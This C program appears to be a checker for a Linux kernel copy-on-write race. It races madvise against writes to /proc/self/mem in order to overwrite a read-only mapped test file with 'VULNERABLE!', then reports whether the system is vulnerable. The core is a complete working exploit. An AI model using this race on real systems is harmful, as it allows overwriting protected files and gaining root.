#include "prefix.h"

#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <unistd.h>
#include <pthread.h>
#include <string.h>

#define ITERATIONS 100000000
#define DEBUG_ITER_PRINT_IVAL 10000000

#define __PRINT_ITERATION(it, strl)					\
	if (0 == (it % DEBUG_ITER_PRINT_IVAL)) {			\
		__DEBUG_PRINTF(strl " iteration %u" NL, it);	\
	}


static const char *file_content = "VULNERABLE!" NL;

struct thread_arguments {
	bool cont;
	const char * const path;
	void * const map;
	const char * const str;
};

static void *poll_thread(void *arg) {
	__DEBUG_PRINTF("poll_thread called" NL);

	int fd = -1;
	char *buf = NULL;
	struct thread_arguments *args = (struct thread_arguments *)arg;

	size_t slen = strlen(args->str);

	if ((fd = open(args->path, O_RDONLY)) < 0) {
		(void)perror("poll: open()");
		goto fail;
	}

	if (!(buf = (char *)calloc((slen + 1), sizeof(char)))) {
		(void)perror("poll: calloc()");
		goto fail;
	}

	while (args->cont) {
		(void)sleep(1);
		__DEBUG_PRINTF("Polling..." NL);

		if (lseek(fd, 0, SEEK_SET)) {
			/* lseek failed */
			if (errno) {
				(void)perror("write: lseek()");
			} else {
				(void)fprintf(stderr, "write: did not seek to correct"
							  "position, but no error code was given" NL);
			}
			continue;
		}

		if (slen == read(fd, buf, slen)
			&& !strncmp(args->str, buf, slen)) {
			/* we read what we wanted -> done */
			__DEBUG_PRINTF("Read file contents: '%s'" NL, buf);
			args->cont = false;

			goto cleanup;
		}
	}

  fail:
  cleanup:
	(void)free(buf);
	if (fd >= 0 && close(fd)) {
		(void)perror("poll: close()");
	}
	return NULL;
}

static void *madvise_thread(void *arg) {
	__DEBUG_PRINTF("madvise_thread called" NL);

	struct thread_arguments *args = (struct thread_arguments *)arg;
	void *map = args->map;

	int i, c = 0;
	for (i = 0; args->cont && i < ITERATIONS; ++i) {
		__PRINT_ITERATION(i, "madvise thread");

		c += madvise(map, 100, MADV_DONTNEED);
	}

	args->cont = false;

	__DEBUG_PRINTF("madvise %d" NL, c);
	return NULL;
}

static void *memwrite_thread(void *arg) {
	__DEBUG_PRINTF("memwrite_thread called" NL);

	struct thread_arguments *args = (struct thread_arguments *)arg;
	int fd = -1, i, c = 0;
	off_t map = (off_t)args->map;
	const char *str = args->str;
	size_t len = strlen(str);

	if ((fd = open("/proc/self/mem", O_RDWR)) < 0) {
		(void)perror("write: open()");
		goto fail;
	}

	for (i = 0; args->cont && i < ITERATIONS; ++i) {
		__PRINT_ITERATION(i, "memwrite thread")

		if (map == lseek(fd, map, SEEK_SET)) {
			c += write(fd, str, len);
		} else {
			if (errno) {
				(void)perror("write: lseek()");
			} else {
				(void)fprintf(stderr, "write: did not seek to correct"
							  "position, but no error code was given" NL);
			}
		}
	}

  fail:
	args->cont = false;
	if (fd >= 0 && close(fd)) {
		(void)perror("write: close()");
	}

	__DEBUG_PRINTF("memwrite %d" NL, c);
	return NULL;
}

static int run_test() {
	bool vulnerable = false;
	int fd = -1;
	char *buf = NULL;
	void *map = NULL;
	struct stat st;

	const char *filepath = __TESTER_FILE__;
	(void)printf("Using file '%s' for testing..." NL, filepath);

	if ((fd = open(filepath, O_RDONLY)) < 0) {
		(void)perror("run: open()");
		goto fail;
	}

	if (fstat(fd, &st)) {
		(void)perror("run: fstat()");
		goto fail;
	}

	if (MAP_FAILED == (map = mmap(NULL, st.st_size, PROT_READ,
								  MAP_PRIVATE, fd, 0))) {

		(void)perror("run: mmap()");
		(void)fprintf(stderr, "st_size = %zu ; fd = %u" NL,
					  (size_t)st.st_size, fd);
		goto fail;
	}

	__DEBUG_PRINTF("mmap %p" NL, map);

	struct thread_arguments args = {
		.cont = true,
		.path = filepath,
		.map = map,
		.str = file_content
	};

	/* start threads */
	pthread_t th_advise, th_write, th_poll;

	(void)printf("Racing..." NL);
	(void)pthread_create(&th_advise, NULL, madvise_thread, (void *)&args);
	(void)pthread_create(&th_write, NULL, memwrite_thread, (void *)&args);
	(void)pthread_create(&th_poll, NULL, poll_thread, (void *)&args);

	/* wait for threads to finish */
	(void)pthread_join(th_advise, NULL);
	(void)pthread_join(th_write, NULL);
	(void)pthread_cancel(th_poll);

	(void)printf("Racing done." NL);

	/* check vulnerability */
	size_t slen = strlen(args.str);
	buf = (char *)calloc((slen + 1), sizeof(char));

	/* seek to the beginning of the file to read its contents */
	if (lseek(fd, 0, SEEK_SET)) {
		(void)perror("run: lseek()");
		goto fail;
	}

	if (slen == read(fd, buf, slen)
		&& !strncmp(args.str, buf, slen)) {
		/* vulnerable */
		vulnerable = true;

		(void)printf("Your system is vulnerable!" NL);
		(void)printf("If you think this is wrong, restart your system "
					 "to ensure that an updated kernel gets active." NL);
	} else {
		/* not vulnerable */
		vulnerable = false;

		(void)printf("Your system appears to be safe!" NL);
		(void)printf("Instead of the expected '%s' we read:" NL, args.str);
		(void)printf("%s" NL, buf);
	}


  cleanup:
	(void)free(buf);
	if (fd >= 0 && close(fd)) {
		(void)perror("run: close()");
	}

	if (map && munmap(map, st.st_size)) {
		(void)perror("run: munmap()");
	}

	return (vulnerable ? EXIT_SUCCESS : EXIT_FAILURE);

  fail:
	vulnerable = false;
	goto cleanup;
}

int main(int argc, char *argv[]) {
	return run_test();
}
